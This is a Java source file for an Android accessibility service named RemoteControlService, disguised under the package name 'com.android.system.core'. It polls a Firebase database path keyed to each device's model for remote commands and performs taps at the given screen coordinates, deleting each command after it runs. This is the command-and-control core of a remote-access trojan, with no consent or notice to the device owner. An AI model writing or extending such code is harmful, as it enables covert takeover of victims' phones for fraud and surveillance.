package com.android.system.core;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.GestureDescription;
import android.graphics.Path;
import android.view.accessibility.AccessibilityEvent;

import com.google.firebase.database.ChildEventListener;
import com.google.firebase.database.DataSnapshot;
import com.google.firebase.database.DatabaseError;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;

public class RemoteControlService extends AccessibilityService {

    private DatabaseReference commandRef;

    @Override
    protected void onServiceConnected() {
        super.onServiceConnected();
        commandRef = FirebaseDatabase.getInstance().getReference("devices").child(Build.MANUFACTURER + "_" + Build.MODEL.replace(" ", "_")).child("cmd");

        commandRef.addChildEventListener(new ChildEventListener() {
            @Override
            public void onChildAdded(DataSnapshot snapshot, String previousChildName) {
                executeCommand(snapshot.getKey(), snapshot.getValue(String.class));
                commandRef.child(snapshot.getKey()).removeValue();
            }
            @Override public void onChildChanged(DataSnapshot snapshot, String previousChildName) {}
            @Override public void onChildRemoved(DataSnapshot snapshot) {}
            @Override public void onChildMoved(DataSnapshot snapshot, String previousChildName) {}
            @Override public void onCancelled(DatabaseError error) {}
        });
    }

    private void executeCommand(String commandId, String data) {
        if ("t".equals(commandId)) {
            try {
                String[] coords = data.split(",");
                int x = Integer.parseInt(coords[0]);
                int y = Integer.parseInt(coords[1]);
                performTap(x, y);
            } catch (Exception e) { /* Ignorar */ }
        }
    }

    private void performTap(int x, int y) {
        Path path = new Path();
        path.moveTo(x, y);
        GestureDescription.StrokeDescription stroke = new GestureDescription.StrokeDescription(path, 0, 100);
        GestureDescription.Builder builder = new GestureDescription.Builder();
        builder.addStroke(stroke);
        dispatchGesture(builder.build(), null, null);
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {}
    @Override
    public void onInterrupt() {}
}